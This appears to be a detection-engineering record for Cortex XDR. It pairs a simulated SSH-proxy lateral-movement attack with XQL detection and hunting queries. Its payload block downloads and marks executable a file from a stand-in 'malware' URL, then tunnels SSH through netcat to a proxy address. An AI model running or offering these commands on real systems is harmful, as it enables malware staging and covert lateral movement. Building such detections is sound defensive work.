identity.description: An attacker uses SSH proxy commands to create a tunnel for lateral movement, which triggers the 'Unusual SSH activity that resembles SSH proxy' alert. Cortex should detect the SSH process start with specific proxy arguments and network connections.

techniques.name: Command and Scripting Interpreter: Unix Shell

payload.code:
mkdir -p /tmp/ssh-tunnel
wget -O /tmp/ssh-tunnel/ssh_client https://example.com/malware
chmod +x /tmp/ssh-tunnel/ssh_client
ssh -o ProxyCommand='nc -X connect -x 192.0.2.10:1080 %h %p' user@target-host

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: SSH Proxy Command Execution
biocs.description: Detection of SSH process starting with ProxyCommand argument
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'ssh' and action_process_image_name = 'nc'
| filter action_file_path contains 'ProxyCommand'

abiocs.name: Unusual SSH Proxy Activity
abiocs.description: SSH process with proxy command that resembles known attack patterns
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'ssh' and action_process_image_name = 'nc'
| filter action_file_path contains 'ProxyCommand'
| filter action_remote_ip = '192.0.2.10'
abiocs.causality_anchor: SSH process starting with proxy command

xql_queries.name: SSH Proxy Command Hunt
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = 'ssh' and action_process_image_name = 'nc'
| filter action_file_path contains 'ProxyCommand'
| filter action_remote_ip = '192.0.2.10'
